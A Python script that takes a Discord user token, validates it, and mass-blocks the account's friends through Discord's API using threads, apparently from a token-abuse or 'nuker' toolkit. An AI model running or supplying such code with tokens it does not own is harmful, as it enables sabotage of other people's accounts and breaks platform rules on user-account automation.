import requests
import threading
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

def ErrorModule(e):
    """Prints error messages in a consistent format."""
    print(f"{Fore.RED}[!] {Fore.RED}Error: {e}")

def BlockFriends(token, friends):
    """Blocks a list of friends using the provided Discord token."""
    for friend in friends:
        try:
            requests.put(
                f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                headers={'Authorization': token},
                json={"type": 2}
            )
            print(f"{Fore.RED}[+] {Fore.GREEN}Blocked {Fore.CYAN}{friend['user']['username']}#{friend['user']['discriminator']}")
        except Exception as e:
            print(f"{Fore.RED}[!] {Fore.YELLOW}Failed to block {Fore.CYAN}{friend['user']['username']}#{friend['user']['discriminator']}: {e}")

def run():
    """Main function to handle user input and block friends."""
    try:
        # Prompt the user to enter the Discord token
        token = input(f"{Fore.RED}[*] {Fore.GREEN}Enter Discord Token: {Fore.RESET}").strip()

        # Verify the token by making an API request to Discord
        response = requests.get(
            'https://discord.com/api/v8/users/@me',
            headers={'Authorization': token, 'Content-Type': 'application/json'}
        )

        if response.status_code != 200:
            print(f"{Fore.RED}[!] {Fore.YELLOW}Invalid Token. Exiting...")
            return

        print(f"{Fore.RED}[+] {Fore.GREEN}Token is valid.")

        # Fetch the user's friends
        friends = requests.get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers={'Authorization': token}
        ).json()

        if not friends:
            print(f"{Fore.RED}[!] {Fore.YELLOW}No friends found.")
            return

        # Prompt the user to block all friends or specific friends
        block_choice = input(
            f"{Fore.RED}[*] {Fore.GREEN}Enter 'all' to Block All Friends or Enter Specific Friend IDs Separated by Commas: {Fore.RESET}"
        ).strip()

        if block_choice.lower() == 'all':
            print(f"{Fore.RED}[+] {Fore.GREEN}Blocking All Friends...")
            threads = []
            for chunk in [friends[i:i + 3] for i in range(0, len(friends), 3)]:
                thread = threading.Thread(target=BlockFriends, args=(token, chunk))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
        else:
            # Block specific friends based on user input
            friend_ids_to_block = [friend_id.strip() for friend_id in block_choice.split(",")]
            friends_to_block = [friend for friend in friends if str(friend['id']) in friend_ids_to_block]

            if not friends_to_block:
                print(f"{Fore.RED}[!] {Fore.YELLOW}No matching friends found.")
            else:
                print(f"{Fore.RED}[+] {Fore.GREEN}Blocking Specified Friends...")
                threads = []
                for chunk in [friends_to_block[i:i + 3] for i in range(0, len(friends_to_block), 3)]:
                    thread = threading.Thread(target=BlockFriends, args=(token, chunk))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()

    except Exception as e:
        ErrorModule(e)

# Run the script
if __name__ == "__main__":
    run()